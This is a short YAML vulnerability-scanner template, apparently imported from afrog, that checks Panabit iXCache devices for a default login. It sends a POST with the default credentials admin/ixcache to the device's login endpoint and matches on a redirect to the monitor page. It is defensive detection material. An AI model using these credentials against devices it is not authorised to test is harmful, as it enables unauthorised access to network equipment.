# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - body: username=admin&password=ixcache
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - URL=/cgi-bin/monitor.cgi
        case-insensitive: true
        condition: and
    method: POST
    path:
      - '{{BaseURL}}/login/userverify.cgi'
id: panabit-ixcache-default-password
info:
  author: B1anda0
  description: body="<title>iXCache</title>"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: Panabit Ixcache Default Password
  severity: high
  tags: panabit,ixcache,defaultpassword,argus-import
